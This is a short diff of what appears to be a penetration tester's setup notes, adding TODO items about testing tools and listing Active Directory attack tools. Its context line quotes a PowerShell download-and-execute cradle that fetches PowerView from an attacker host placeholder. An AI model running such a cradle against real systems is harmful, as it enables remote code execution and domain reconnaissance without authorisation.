@@ -59,6 +59,8 @@ IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/powerview.ps1")
 
 ## TODOs
 
+- test rust apps: rustscan navi
+- test new nvim install method to see if its still working because kali removed it from its official repo
 - [AD] https://github.com/eladshamir/Whisker
 - [AD] https://github.com/ropnop/kerbrute
 - Bloodhound to Bloodhound CE https://blog.spookysec.net//Deploying-BHCE/
